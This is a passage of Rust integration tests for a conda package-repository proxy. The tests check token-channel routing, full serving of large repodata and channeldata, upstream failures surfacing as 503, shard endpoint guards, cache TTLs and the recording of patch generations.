                "noarch/current_repodata.json",
                "noarch/run_exports.json",
                "noarch/patch_instructions.json",
                "noarch/repodata.json.jlap",
                "channeldata.json",
                "notices.json",
            ] {
                let app = fx.router_with_auth(token_router());
                let (status, _b) = tdh::send(app, tdh::get(format!("/{tok}/{key}/{suffix}"))).await;
                assert_eq!(
                    status,
                    StatusCode::OK,
                    "token-channel read `{suffix}` must resolve the repo key"
                );
            }

            // The package download binds the FINAL segment as the filename
            // (4-tuple) and streams the stored bytes.
            let app = fx.router_with_auth(token_router());
            let (status, body) =
                tdh::send(app, tdh::get(format!("/{tok}/{key}/noarch/{filename}"))).await;
            assert_eq!(
                status,
                StatusCode::OK,
                "token-channel package download must resolve the filename"
            );
            assert_eq!(
                &body[..],
                &content[..],
                "download must stream the stored package bytes"
            );

            // Signing-key routes have no key configured for the fixture repo,
            // so they 404 -- but the handler is reached (repo key bound),
            // exercising the token-aware wrappers.
            for suffix in ["keys/repo.pub", "noarch/repodata.json.sig"] {
                let app = fx.router_with_auth(token_router());
                let (status, _b) = tdh::send(app, tdh::get(format!("/{tok}/{key}/{suffix}"))).await;
                assert_eq!(
                    status,
                    StatusCode::NOT_FOUND,
                    "signing route `{suffix}` reaches the handler and 404s (no key)"
                );
            }
        };

        assertions.await;
        fx.teardown().await;
    }

    // -----------------------------------------------------------------------
    // Remote conda-forge repodata proxy: cap ceiling + failure propagation,
    // and CEP-16 sharded repodata scoping. A Remote conda repo's real
    // repodata.json.zst (e.g. conda-forge's noarch/osx-arm64 channels)
    // commonly runs 20-30 MiB, well past the 8 MiB DEFAULT_METADATA_MAX_BYTES
    // tier most other formats' metadata proxying uses. The old code silently
    // fell through to `build_repodata` (DB-only) whenever the capped fetch
    // failed for ANY reason, serving a valid-looking but empty 200 instead of
    // the real upstream index, or an error. These tests pin the fix: the
    // LARGE tier makes the real-sized fetch succeed, and any other upstream
    // failure now surfaces to the client instead of being masked.
    // -----------------------------------------------------------------------

    /// Insert a Remote conda repo pointing at `upstream_url`, marked public so
    /// anonymous test requests pass `check_read_access`. Returns its id/key.
    async fn insert_public_remote_conda_repo(
        pool: &sqlx::PgPool,
        upstream_url: &str,
    ) -> (uuid::Uuid, String, std::path::PathBuf) {
        let (repo_id, repo_key, storage_dir) =
            crate::api::handlers::test_db_helpers::create_repo(pool, "remote", "conda").await;
        sqlx::query("UPDATE repositories SET upstream_url = $1, is_public = true WHERE id = $2")
            .bind(upstream_url)
            .bind(repo_id)
            .execute(pool)
            .await
            .expect("point repo at upstream and make it public");
        (repo_id, repo_key, storage_dir)
    }

    async fn cleanup_conda_repo(pool: &sqlx::PgPool, repo_id: uuid::Uuid) {
        let _ = sqlx::query("DELETE FROM repositories WHERE id = $1")
            .bind(repo_id)
            .execute(pool)
            .await;
    }

    /// #3556: a Remote conda PACKAGE download must be cached with the
    /// effectively-infinite lifetime its coordinate deserves.
    ///
    /// `download_package`'s Remote arm proxied through
    /// `proxy_fetch_streaming_with_disposition`, which synthesized a
    /// `RepositoryFormat::Generic` repository. `Generic` has no
    /// `cache_classifier` arm, so a `.conda`/`.tar.bz2` build artifact — which
    /// a conda channel never republishes under the same filename — fell to the
    /// 5-minute mutable default and was re-downloaded from upstream every five
    /// minutes.
    ///
    /// The assertion is on the TTL WRITTEN into the cache sidecar.
    /// `classify(Conda, "linux-64/x.conda")` was already `Immutable` before the
    /// fix and was simply never consulted with the conda format, so a
    /// classifier-level test passes with the bug intact.
    ///
    /// `repodata_from_packages.json` is the mutable negative control: a real
    /// conda channel document that this same route serves (it has no dedicated
    /// route of its own), through the same handler, helper and format. Conda
    /// rewrites its repodata in place, so a "cache every conda path forever"
    /// change — the unrecoverable direction, since `evaluate` short-circuits
    /// `Immutable` without consulting `expires_at` — fails here.
    #[tokio::test]
    async fn remote_conda_package_proxy_cache_ttl_is_format_classified_3556() {
        use crate::api::handlers::test_db_helpers as tdh;
        use wiremock::matchers::{method, path as wm_path};
        use wiremock::{Mock, MockServer, ResponseTemplate};

        let Some(pool) = tdh::try_pool().await else {
            return;
        };

        const CONDA_PKG: &str = "linux-64/numpy-1.26.4-py312h1234567_0.conda";
        const BZ2_PKG: &str = "linux-64/scipy-1.11.4-py312h7654321_0.tar.bz2";
        const CHANNEL_DOC: &str = "linux-64/repodata_from_packages.json";

        let server = MockServer::start().await;
        for (p, ct) in [
            (CONDA_PKG, "application/octet-stream"),
            (BZ2_PKG, "application/x-tar"),
            (CHANNEL_DOC, "application/json"),
        ] {
            Mock::given(method("GET"))
                .and(wm_path(format!("/{p}")))
                .respond_with(
                    ResponseTemplate::new(200)
                        .insert_header("content-type", ct)
                        .set_body_bytes(format!("conda-3556-body-for-{p}").into_bytes()),
                )
                .mount(&server)
                .await;
        }

        let tmp = std::env::temp_dir().join(format!("conda-ttl-3556-{}", uuid::Uuid::new_v4()));
        std::fs::create_dir_all(&tmp).expect("tmp");
        let root = tmp.to_str().unwrap();
        let proxy = tdh::build_proxy_service_with_fs(pool.clone(), root);
        let state = tdh::build_state_with_proxy(pool.clone(), root, proxy);
        let (repo_id, repo_key, _dir) = insert_public_remote_conda_repo(&pool, &server.uri()).await;

        for p in [CONDA_PKG, BZ2_PKG, CHANNEL_DOC] {
            let app = tdh::router_anon(router(), state.clone());
            let (status, body) = tdh::send(app, tdh::get(format!("/{repo_key}/{p}"))).await;
            assert_eq!(
                status,
                StatusCode::OK,
                "GET {p} must proxy 200 before its cache TTL means anything"
            );
            // Draining is what lets the streaming tee commit a sidecar to read.
            let _ = body.len();
        }

        let conda_ttl = tdh::written_proxy_ttl_secs(&tmp, &repo_key, CONDA_PKG).await;
        let bz2_ttl = tdh::written_proxy_ttl_secs(&tmp, &repo_key, BZ2_PKG).await;
        let doc_ttl = tdh::written_proxy_ttl_secs(&tmp, &repo_key, CHANNEL_DOC).await;

        cleanup_conda_repo(&pool, repo_id).await;
        let _ = std::fs::remove_dir_all(&tmp);

        let mutable = crate::services::cache_classifier::MUTABLE_DEFAULT_TTL_SECS;
        assert!(
            conda_ttl >= tdh::IMMUTABLE_TTL_FLOOR_SECS,
            "a `.conda` build artifact is version- and build-pinned and must be cached \
             as immutable; got {conda_ttl}s — {mutable}s is the #3556 symptom (the \
             package arm handing the classifier a `Generic` format)"
        );
        assert!(
            bz2_ttl >= tdh::IMMUTABLE_TTL_FLOOR_SECS,
            "the legacy `.tar.bz2` package format travels the same arm and must be \
             cached as immutable too; got {bz2_ttl}s"
        );
        assert!(
            doc_ttl <= mutable,
            "a conda channel document is rewritten in place and must STAY mutable, \
             got {doc_ttl}s — this negative control is what keeps the immutable \
             assertions from passing under a 'cache every conda path forever' change"
        );
    }

    // A 9 MiB repodata.json.zst -- above the old 8 MiB DEFAULT ceiling that
    // used to make the capped fetch fail and silently fall back to an empty
    // `build_repodata` -- is now fetched and served in full (LARGE tier).
    #[tokio::test]
    async fn remote_repodata_above_default_cap_is_served_in_full() {
        use crate::api::handlers::test_db_helpers as tdh;
        use wiremock::matchers::{method, path as wm_path};
        use wiremock::{Mock, MockServer, ResponseTemplate};

        let Some(pool) = tdh::try_pool().await else {
            return;
        };
        let body = vec![0x5au8; 9 * 1024 * 1024];
        assert!(
            body.len() > proxy_helpers::DEFAULT_METADATA_MAX_BYTES
                && body.len() < proxy_helpers::LARGE_METADATA_MAX_BYTES,
            "fixture must straddle DEFAULT and LARGE so success implies the LARGE tier",
        );

        let server = MockServer::start().await;
        Mock::given(method("GET"))
            .and(wm_path("/noarch/repodata.json.zst"))
            .respond_with(ResponseTemplate::new(200).set_body_bytes(body.clone()))
            .mount(&server)
            .await;

        let tmp = std::env::temp_dir().join(format!("conda-cap-{}", uuid::Uuid::new_v4()));
        std::fs::create_dir_all(&tmp).expect("tmp");
        let root = tmp.to_str().unwrap();
        let proxy = tdh::build_proxy_service_with_fs(pool.clone(), root);
        let state = tdh::build_state_with_proxy(pool.clone(), root, proxy);
        let (repo_id, repo_key, _dir) = insert_public_remote_conda_repo(&pool, &server.uri()).await;

        let app = tdh::router_anon(router(), state);
        let (status, resp_body) = tdh::send(
            app,
            tdh::get(format!("/{repo_key}/noarch/repodata.json.zst")),
        )
        .await;

        cleanup_conda_repo(&pool, repo_id).await;
        let _ = std::fs::remove_dir_all(&tmp);

        assert_eq!(
            status,
            StatusCode::OK,
            "a repodata.json.zst above the old 8 MiB cap must now succeed"
        );
        // Byte equality, not just length: a truncated-at-the-cap body and a
        // correctly proxied one can only be told apart by content.
        assert_eq!(
            &resp_body[..],
            &body[..],
            "the full upstream body must be served verbatim (got {} bytes, want {})",
            resp_body.len(),
            body.len(),
        );
    }

    // A genuine upstream failure (a 500, which `validate_upstream_status` folds
    // to `ServiceUnavailable` and `map_proxy_error` renders as 503) must surface
    // to the client instead of being swallowed into a silent fallback that
    // serves an empty, DB-only repodata.json with 200 (the
    // conda-forge-discovery-blocking bug this fixes).
    #[tokio::test]
    async fn remote_repodata_upstream_failure_surfaces_not_empty_200() {
        use crate::api::handlers::test_db_helpers as tdh;
        use wiremock::matchers::{method, path as wm_path};
        use wiremock::{Mock, MockServer, ResponseTemplate};

        let Some(pool) = tdh::try_pool().await else {
            return;
        };
        let server = MockServer::start().await;
        Mock::given(method("GET"))
            .and(wm_path("/noarch/repodata.json.zst"))
            .respond_with(ResponseTemplate::new(500))
            .mount(&server)
            .await;

        let tmp = std::env::temp_dir().join(format!("conda-502-{}", uuid::Uuid::new_v4()));
        std::fs::create_dir_all(&tmp).expect("tmp");
        let root = tmp.to_str().unwrap();
        let proxy = tdh::build_proxy_service_with_fs(pool.clone(), root);
        let state = tdh::build_state_with_proxy(pool.clone(), root, proxy);
        let (repo_id, repo_key, _dir) = insert_public_remote_conda_repo(&pool, &server.uri()).await;

        let app = tdh::router_anon(router(), state);
        let (status, resp_body) = tdh::send(
            app,
            tdh::get(format!("/{repo_key}/noarch/repodata.json.zst")),
        )
        .await;

        cleanup_conda_repo(&pool, repo_id).await;
        let _ = std::fs::remove_dir_all(&tmp);

        // Concrete status, not merely "some 5xx": #1445 fixes upstream 5xx at
        // 503 Service Unavailable (never a raw 502, never the masked 200).
        assert_eq!(
            status,
            StatusCode::SERVICE_UNAVAILABLE,
            "an upstream 5xx must surface as 503, got {status} with body {:?}",
            String::from_utf8_lossy(&resp_body),
        );
        assert!(
            !String::from_utf8_lossy(&resp_body).contains("repodata_version"),
            "the failure response must not be a fabricated repodata document"
        );
    }

    // CEP-16 sharded repodata is only ever built from artifacts already in our
    // own DB (never proxied from upstream). For a Remote repo with nothing
    // cached yet, the old code served a syntactically valid but semantically
    // empty shard index with 200 -- which a CEP-16-aware client treats as
    // authoritative and will NOT fall back from, hiding every upstream
    // package. The endpoint must 404 for Remote repos instead, so clients
    // take the documented fallback to repodata.json.
    #[tokio::test]
    async fn remote_repo_sharded_index_404s_instead_of_empty_200() {
        use crate::api::handlers::test_db_helpers as tdh;

        let Some(pool) = tdh::try_pool().await else {
            return;
        };
        let tmp = std::env::temp_dir().join(format!("conda-shard-{}", uuid::Uuid::new_v4()));
        std::fs::create_dir_all(&tmp).expect("tmp");
        let root = tmp.to_str().unwrap();
        let proxy = tdh::build_proxy_service_with_fs(pool.clone(), root);
        let state = tdh::build_state_with_proxy(pool.clone(), root, proxy);
        let (repo_id, repo_key, _dir) =
            insert_public_remote_conda_repo(&pool, "https://upstream.example.test").await;

        let app = tdh::router_anon(router(), state);
        let (status, _body) = tdh::send(
            app,
            tdh::get(format!("/{repo_key}/noarch/repodata_shards.msgpack.zst")),
        )
        .await;

        cleanup_conda_repo(&pool, repo_id).await;
        let _ = std::fs::remove_dir_all(&tmp);

        assert_eq!(
            status,
            StatusCode::NOT_FOUND,
            "sharded repodata for a Remote conda repo must 404, not serve an empty 200"
        );
    }

    // Preserve existing behavior for Local/hosted conda repos: the shard index
    // is (and remains) built from the repo's own DB artifacts and returns 200.
    #[tokio::test]
    async fn local_repo_sharded_index_still_returns_200() {
        use crate::api::handlers::test_db_helpers as tdh;

        let Some(pool) = tdh::try_pool().await else {
            return;
        };
        let (repo_id, repo_key, _storage_dir) = tdh::create_repo(&pool, "local", "conda").await;
        sqlx::query("UPDATE repositories SET is_public = true WHERE id = $1")
            .bind(repo_id)
            .execute(&pool)
            .await
            .expect("make repo public");

        let tmp = std::env::temp_dir().join(format!("conda-local-shard-{}", uuid::Uuid::new_v4()));
        std::fs::create_dir_all(&tmp).expect("tmp");
        let root = tmp.to_str().unwrap();
        let proxy = tdh::build_proxy_service_with_fs(pool.clone(), root);
        let state = tdh::build_state_with_proxy(pool.clone(), root, proxy);

        let app = tdh::router_anon(router(), state);
        let (status, _body) = tdh::send(
            app,
            tdh::get(format!("/{repo_key}/noarch/repodata_shards.msgpack.zst")),
        )
        .await;

        cleanup_conda_repo(&pool, repo_id).await;
        let _ = std::fs::remove_dir_all(&tmp);

        assert_eq!(
            status,
            StatusCode::OK,
            "a Local/hosted conda repo's shard index must still serve 200"
        );
    }

    // -----------------------------------------------------------------------
    // #4051: a proxied repodata response must be attributable to a RECORDED
    // upstream patch generation — the content hash of the upstream
    // `{subdir}/patch_instructions.json` in effect at serve time — exposed on
    // the response and persisted server-side, so an upstream patch revision
    // shows up as a NEW generation rather than passing silently.
    // -----------------------------------------------------------------------

    const PATCH_INSTRUCTIONS_A: &str = r#"{
        "info": {"subdir": "noarch"},
        "packages": {
            "numpy-1.26.4-py312h1234567_0.tar.bz2": {"depends": ["python >=3.12"]}
        },
        "packages.conda": {},
        "remove": [],
        "revoke": []
    }"#;

    // Same document as A except the patched dependency spec — i.e. exactly the
    // kind of silent metadata rewrite an upstream repodata patch applies.
    const PATCH_INSTRUCTIONS_B: &str = r#"{
        "info": {"subdir": "noarch"},
        "packages": {
            "numpy-1.26.4-py312h1234567_0.tar.bz2": {"depends": ["python >=3.12,<3.13"]}
        },
        "packages.conda": {},
        "remove": [],
        "revoke": []
    }"#;

    /// A minimal-but-real upstream channel: one repodata document and a patch
    /// instructions document, both behind `server`.
    async fn mount_upstream_channel(server: &wiremock::MockServer, patch_body: &'static str) {
        use wiremock::matchers::{method, path as wm_path};
        use wiremock::{Mock, ResponseTemplate};

        Mock::given(method("GET"))
            .and(wm_path("/noarch/repodata.json"))
            .respond_with(ResponseTemplate::new(200).set_body_string(
                r#"{"info":{"subdir":"noarch"},"packages":{},"packages.conda":{}}"#,
            ))
            .mount(server)
            .await;
        Mock::given(method("GET"))
            .and(wm_path("/noarch/patch_instructions.json"))
            .respond_with(
                ResponseTemplate::new(200)
                    .insert_header("content-type", "application/json")
                    .set_body_string(patch_body),
            )
            .mount(server)
            .await;
    }

    /// Fetch the served repodata through a FRESH proxy cache (so the request
    /// always reaches the upstream mock), returning status, body and headers.
    async fn fetch_remote_repodata_fresh_cache(
        pool: &sqlx::PgPool,
        repo_key: &str,
    ) -> (StatusCode, bytes::Bytes, axum::http::HeaderMap) {
        use crate::api::handlers::test_db_helpers as tdh;

        let tmp = std::env::temp_dir().join(format!("conda-4051-{}", uuid::Uuid::new_v4()));
        std::fs::create_dir_all(&tmp).expect("tmp");
        let root = tmp.to_str().unwrap();
        let proxy = tdh::build_proxy_service_with_fs(pool.clone(), root);
        let state = tdh::build_state_with_proxy(pool.clone(), root, proxy);

        let app = tdh::router_anon(router(), state);
        let out =
            tdh::send_with_headers(app, tdh::get(format!("/{repo_key}/noarch/repodata.json")))
                .await;
        let _ = std::fs::remove_dir_all(&tmp);
        out
    }

    async fn recorded_patch_generations(pool: &sqlx::PgPool, repo_id: uuid::Uuid) -> Vec<String> {
        sqlx::query_scalar::<_, String>(
            "SELECT generation FROM conda_repodata_patch_generations \
             WHERE repository_id = $1 AND subdir = 'noarch' ORDER BY first_seen_at, generation",
        )
        .bind(repo_id)
        .fetch_all(pool)
        .await
        .expect("read recorded patch generations")
    }

    // The served response must name the generation, the generation must be
    // recorded, and re-serving the SAME upstream patch document must keep the
    // SAME generation — across a proxy-cache hit and across a fresh re-fetch.
    #[tokio::test]
    async fn remote_repodata_is_attributed_to_recorded_patch_generation() {
        use crate::api::handlers::test_db_helpers as tdh;

        let Some(pool) = tdh::try_pool().await else {
            return;
        };
        let server = wiremock::MockServer::start().await;
        mount_upstream_channel(&server, PATCH_INSTRUCTIONS_A).await;
        let (repo_id, repo_key, _dir) = insert_public_remote_conda_repo(&pool, &server.uri()).await;

        let expected_generation = hex::encode(super::blake2_256(PATCH_INSTRUCTIONS_A.as_bytes()));

        // First serve: cold cache, real upstream fetch.
        let (status, _body, headers) = fetch_remote_repodata_fresh_cache(&pool, &repo_key).await;
        assert_eq!(status, StatusCode::OK);
        let served_generation = headers
            .get("x-repodata-patch-generation")
            .and_then(|v| v.to_str().ok())
            .expect("a proxied repodata response must carry the patch generation header");
        assert_eq!(
            served_generation, expected_generation,
            "the header must name the content hash of the upstream patch_instructions.json"
        );

        // Second serve through yet another fresh cache: a genuine second fetch
        // of identical content must map to the SAME generation.
        let (status, _body, headers2) = fetch_remote_repodata_fresh_cache(&pool, &repo_key).await;
        assert_eq!(status, StatusCode::OK);
        assert_eq!(
            headers2
                .get("x-repodata-patch-generation")
                .and_then(|v| v.to_str().ok()),
            Some(expected_generation.as_str()),
            "identical upstream patch content must keep the same generation"
        );

        let generations = recorded_patch_generations(&pool, repo_id).await;
        cleanup_conda_repo(&pool, repo_id).await;

        assert_eq!(
            generations,
            vec![expected_generation],
            "two fetches of identical patch content must record exactly ONE generation"
        );
    }

    // A change in the upstream patch document must be visible as a NEW
    // recorded generation — not silent — and the next served response must
    // name it.
    #[tokio::test]
    async fn remote_repodata_patch_generation_change_is_recorded_as_new_generation() {
        use crate::api::handlers::test_db_helpers as tdh;

        let Some(pool) = tdh::try_pool().await else {
            return;
        };
        let server = wiremock::MockServer::start().await;
        mount_upstream_channel(&server, PATCH_INSTRUCTIONS_A).await;
        let (repo_id, repo_key, _dir) = insert_public_remote_conda_repo(&pool, &server.uri()).await;

        let (status, _body, headers_a) = fetch_remote_repodata_fresh_cache(&pool, &repo_key).await;
        assert_eq!(status, StatusCode::OK);

        // Upstream rewrites its patch document: reset the mock channel and
        // re-mount it with the patched content (when several mocks match,
        // wiremock serves the FIRST mounted, so a plain re-mount cannot
        // express "the upstream document changed").
        server.reset().await;
        mount_upstream_channel(&server, PATCH_INSTRUCTIONS_B).await;

        let (status, _body, headers_b) = fetch_remote_repodata_fresh_cache(&pool, &repo_key).await;
        assert_eq!(status, StatusCode::OK);

        let gen_a = super::blake2_256(PATCH_INSTRUCTIONS_A.as_bytes());
        let gen_b = super::blake2_256(PATCH_INSTRUCTIONS_B.as_bytes());
        assert_ne!(gen_a, gen_b, "test fixture: the two documents must differ");

        let expected_a = hex::encode(gen_a);
        let expected_b = hex::encode(gen_b);
        assert_eq!(
            headers_a
                .get("x-repodata-patch-generation")
                .and_then(|v| v.to_str().ok()),
            Some(expected_a.as_str())
        );
        assert_eq!(
            headers_b
                .get("x-repodata-patch-generation")
                .and_then(|v| v.to_str().ok()),
            Some(expected_b.as_str()),
            "after the upstream patch change the served response must name the NEW generation"
        );

        let generations = recorded_patch_generations(&pool, repo_id).await;
        cleanup_conda_repo(&pool, repo_id).await;

        assert_eq!(
            generations.len(),
            2,
            "a changed upstream patch document must be recorded as a second generation, got {generations:?}"
        );
        assert!(generations.contains(&expected_a));
        assert!(generations.contains(&expected_b));
    }

    // Hosted (non-proxied) channels have no upstream patch authority: no
    // header, no recorded rows — behavior unchanged.
    #[tokio::test]
    async fn hosted_repodata_has_no_patch_generation_attribution() {
        use crate::api::handlers::test_db_helpers as tdh;

        let Some(pool) = tdh::try_pool().await else {
            return;
        };
        let (repo_id, repo_key, _storage_dir) = tdh::create_repo(&pool, "local", "conda").await;
        sqlx::query("UPDATE repositories SET is_public = true WHERE id = $1")
            .bind(repo_id)
            .execute(&pool)
            .await
            .expect("make repo public");

        let tmp = std::env::temp_dir().join(format!("conda-4051-local-{}", uuid::Uuid::new_v4()));
        std::fs::create_dir_all(&tmp).expect("tmp");
        let root = tmp.to_str().unwrap();
        let proxy = tdh::build_proxy_service_with_fs(pool.clone(), root);
        let state = tdh::build_state_with_proxy(pool.clone(), root, proxy);

        let app = tdh::router_anon(router(), state);
        let (status, _body, headers) =
            tdh::send_with_headers(app, tdh::get(format!("/{repo_key}/noarch/repodata.json")))
                .await;

        let generations = recorded_patch_generations(&pool, repo_id).await;
        cleanup_conda_repo(&pool, repo_id).await;
        let _ = std::fs::remove_dir_all(&tmp);

        assert_eq!(status, StatusCode::OK);
        assert!(
            headers.get("x-repodata-patch-generation").is_none(),
            "a hosted channel has no upstream patch generation to attribute"
        );
        assert!(
            generations.is_empty(),
            "a hosted channel must not record patch generations"
        );
    }

    // -----------------------------------------------------------------------
    // #2915 follow-ups to the #2914 proxy work above.
    //
    // 1. The PACKAGE download path for a Remote repo was routed through the
    //    buffered 8 MiB *metadata* helper, so every real conda package 502'd.
    // 2. `channeldata.json` kept the exact fail-open that was removed from
    //    `serve_repodata`: an 8 MiB cap the real document exceeds, plus an
    //    `if let Ok(..)` that turned the resulting error into an empty 200.
    // 3. The CEP-16 / JLAP guards only covered Remote, so Virtual repos --
    //    whose artifacts belong to their MEMBERS, never to the virtual repo id
    //    `list_conda_artifacts` is scoped to -- still served empty 200s.
    // -----------------------------------------------------------------------

    /// Wire a `SharedState` whose proxy cache lives in a fresh temp dir. The
    /// returned `TempDir` must outlive the request (dropping it deletes the
    /// cache the proxy is writing through).
    fn state_with_proxy_cache(pool: &sqlx::PgPool) -> (crate::api::SharedState, tempfile::TempDir) {
        let dir = tempfile::tempdir().expect("proxy cache tempdir");
        let root = dir.path().to_str().expect("utf8 tempdir path");
        let proxy =
            crate::api::handlers::test_db_helpers::build_proxy_service_with_fs(pool.clone(), root);
        let state = crate::api::handlers::test_db_helpers::build_state_with_proxy(
            pool.clone(),
            root,
            proxy,
        );
        (state, dir)
    }

    /// A 64-hex shard hash that matches no shard. Needed because
    /// `sharded_repodata_shard` validates the hash FORMAT before it resolves the
    /// repository, so a malformed hash 400s and never reaches the repo-type
    /// guard under test.
    fn well_formed_shard_hash() -> String {
        "ab".repeat(32)
    }

    // #2915 BLOCKER regression: a Remote conda package download must stream the
    // whole upstream body. The old code buffered it through
    // `proxy_fetch_capped(.., DEFAULT_METADATA_MAX_BYTES)`, so anything past
    // 8 MiB -- i.e. essentially every package anyone installs (python ~30 MiB,
    // scipy ~17 MiB) -- came back 502. This fixture is deliberately larger than
    // that ceiling, so it FAILS on the pre-fix code, and asserts byte equality
    // so a truncated body cannot pass either.
    #[tokio::test]
    async fn remote_package_download_above_metadata_cap_is_served_in_full() {
        use crate::api::handlers::test_db_helpers as tdh;
        use wiremock::matchers::{method, path as wm_path};
        use wiremock::{Mock, MockServer, ResponseTemplate};

        let Some(pool) = tdh::try_pool().await else {
            return;
        };
        // Non-uniform bytes so a byte-equality assertion is meaningful (a
        // constant fill would match any equally sized garbage body).
        let pkg: Vec<u8> = (0..(9 * 1024 * 1024u32)).map(|i| (i % 251) as u8).collect();
        assert!(
            pkg.len() > proxy_helpers::DEFAULT_METADATA_MAX_BYTES,
            "fixture must exceed the metadata cap the buffered path used"
        );
        let filename = "python-3.12.0-h30d4d87_0.conda";

        let server = MockServer::start().await;
        Mock::given(method("GET"))
            .and(wm_path(format!("/osx-arm64/{filename}")))
            .respond_with(ResponseTemplate::new(200).set_body_bytes(pkg.clone()))
            .mount(&server)
            .await;

        let (state, _cache) = state_with_proxy_cache(&pool);
        let (repo_id, repo_key, _dir) = insert_public_remote_conda_repo(&pool, &server.uri()).await;

        let app = tdh::router_anon(router(), state);
        let (status, resp_body) =
            tdh::send(app, tdh::get(format!("/{repo_key}/osx-arm64/{filename}"))).await;

        cleanup_conda_repo(&pool, repo_id).await;

        assert_eq!(
            status,
            StatusCode::OK,
            "a >8 MiB remote conda package must download, not 502; body was {:?}",
            String::from_utf8_lossy(&resp_body[..resp_body.len().min(200)]),
        );
        assert_eq!(
            &resp_body[..],
            &pkg[..],
            "the streamed package must be byte-identical to upstream (got {} bytes, want {})",
            resp_body.len(),
            pkg.len(),
        );
    }

    // #2915 (4): an upstream `channeldata.json` failure must surface. The old
    // `if let Ok(..)` swallowed it and fell through to the DB-only document,
    // which for a fresh Remote repo is an EMPTY channel description served 200 --
    // indistinguishable, to a client, from "this channel really has no packages".
    #[tokio::test]
    async fn remote_channeldata_upstream_failure_surfaces_instead_of_empty_200() {
        use crate::api::handlers::test_db_helpers as tdh;
        use wiremock::matchers::{method, path as wm_path};
        use wiremock::{Mock, MockServer, ResponseTemplate};

        let Some(pool) = tdh::try_pool().await else {
            return;
        };
        let server = MockServer::start().await;
        Mock::given(method("GET"))
            .and(wm_path("/channeldata.json"))
            .respond_with(ResponseTemplate::new(500))
            .mount(&server)
            .await;

        let (state, _cache) = state_with_proxy_cache(&pool);
        let (repo_id, repo_key, _dir) = insert_public_remote_conda_repo(&pool, &server.uri()).await;

        let app = tdh::router_anon(router(), state);
        let (status, resp_body) =
            tdh::send(app, tdh::get(format!("/{repo_key}/channeldata.json"))).await;

        cleanup_conda_repo(&pool, repo_id).await;

        assert_eq!(
            status,
            StatusCode::SERVICE_UNAVAILABLE,
            "an upstream 5xx on channeldata.json must surface as 503, got {status}"
        );
        assert!(
            !String::from_utf8_lossy(&resp_body).contains("channeldata_version"),
            "the failure response must not be a fabricated (empty) channeldata document"
        );
    }

    // #2915 (4): conda-forge's `channeldata.json` is a single document covering
    // every package in the channel and comfortably exceeds the 8 MiB DEFAULT
    // tier the old code used, so the fetch ALWAYS failed for the channel this
    // endpoint matters most for. It must now be fetched at the LARGE tier and
    // served verbatim.
    #[tokio::test]
    async fn remote_channeldata_above_default_cap_is_served_in_full() {
        use crate::api::handlers::test_db_helpers as tdh;
        use wiremock::matchers::{method, path as wm_path};
        use wiremock::{Mock, MockServer, ResponseTemplate};

        let Some(pool) = tdh::try_pool().await else {
            return;
        };
        // A real (if degenerate) JSON document above the DEFAULT cap and below
        // the LARGE one, so success implies the LARGE tier specifically.
        let body = format!(
            "{{\"channeldata_version\":1,\"packages\":{{}},\"_pad\":\"{}\"}}",
            "p".repeat(9 * 1024 * 1024)
        )
        .into_bytes();
        assert!(
            body.len() > proxy_helpers::DEFAULT_METADATA_MAX_BYTES
                && body.len() < proxy_helpers::LARGE_METADATA_MAX_BYTES,
            "fixture must straddle DEFAULT and LARGE"
        );

        let server = MockServer::start().await;
        Mock::given(method("GET"))
            .and(wm_path("/channeldata.json"))
            .respond_with(
                ResponseTemplate::new(200)
                    .set_body_bytes(body.clone())
                    .insert_header("content-type", "application/json"),
            )
            .mount(&server)
            .await;

        let (state, _cache) = state_with_proxy_cache(&pool);
        let (repo_id, repo_key, _dir) = insert_public_remote_conda_repo(&pool, &server.uri()).await;

        let app = tdh::router_anon(router(), state);
        // No `Accept-Encoding`, so `cacheable_response` serves the identity body
        // and the comparison below is against the upstream bytes directly.
        let (status, resp_body) =
            tdh::send(app, tdh::get(format!("/{repo_key}/channeldata.json"))).await;

        cleanup_conda_repo(&pool, repo_id).await;

        assert_eq!(
            status,
            StatusCode::OK,
            "a channeldata.json above the old 8 MiB cap must now succeed"
        );
        assert_eq!(
            &resp_body[..],
            &body[..],
            "the full upstream channeldata must be served verbatim (got {} bytes, want {})",
            resp_body.len(),
            body.len(),
        );
    }

    // #2915 (5): the shard ENDPOINT needs the same repo-type guard the index
    // endpoint got -- a Remote repo has no shard rows of its own, so without the
    // guard it answers 404 "Shard not found" for a reason that has nothing to do
    // with the repository being unsupported, and the index/shard pair disagree
    // about whether CEP-16 exists here.
    #[tokio::test]
    async fn remote_repo_sharded_shard_404s() {
        use crate::api::handlers::test_db_helpers as tdh;

        let Some(pool) = tdh::try_pool().await else {
            return;
        };
        let (state, _cache) = state_with_proxy_cache(&pool);
        let (repo_id, repo_key, _dir) =
            insert_public_remote_conda_repo(&pool, "https://upstream.example.test").await;

        let app = tdh::router_anon(router(), state);
        let hash = well_formed_shard_hash();
        let (status, body) = tdh::send(
            app,
            tdh::get(format!("/{repo_key}/noarch/shards/{hash}.msgpack.zst")),
        )
        .await;

        cleanup_conda_repo(&pool, repo_id).await;

        assert_eq!(
            status,
            StatusCode::NOT_FOUND,
            "a CEP-16 shard fetch against a Remote conda repo must 404"
        );
        assert!(
            String::from_utf8_lossy(&body).contains("local/hosted"),
            "the 404 must come from the repo-type guard, not the shard lookup; got {:?}",
            String::from_utf8_lossy(&body),
        );
    }

    // The Local counterpart: a hosted repo's own DB rows ARE authoritative, so a
    // shard whose content hash the client asks for is still served with 200 and
    // the exact shard bytes.
    #[tokio::test]
    async fn local_repo_sharded_shard_still_returns_200() {
        use crate::api::handlers::test_db_helpers as tdh;

        let Some(fx) = tdh::Fixture::setup("local", "conda").await else {
            return;
        };
        let repo = fx.repo_info("local", None);
        let pkg_path = "linux-64/zlib-1.3-h4ab18f5_1.conda";
        tdh::seed_artifact(
            &fx.state,
            &fx.pool,
            &repo,
            pkg_path,
            pkg_path,
            "zlib",
            "1.3",
            "application/octet-stream",
            Bytes::from_static(b"conda package payload"),
            fx.user_id,
        )
        .await;

        let assertions = async {
            // Recompute the content-addressed shard hash exactly as the index
            // endpoint advertises it, so the request is one a real CEP-16 client
            // would make after reading the index.
            let all = list_conda_artifacts(&fx.pool, fx.repo_id)
                .await
                .expect("list conda artifacts");
            let subdir_artifacts = artifacts_for_subdir(&all, "linux-64");
            let by_name = group_artifacts_by_name(&subdir_artifacts);
            let artifacts = by_name.get("zlib").expect("seeded package must shard");
            let shard = build_shard("linux-64", artifacts);
            let shard_compressed = serialize_msgpack_zst(&shard).expect("serialize shard");
            let mut hasher = Sha256::new();
            hasher.update(&shard_compressed);
            let hash = format!("{:x}", hasher.finalize());

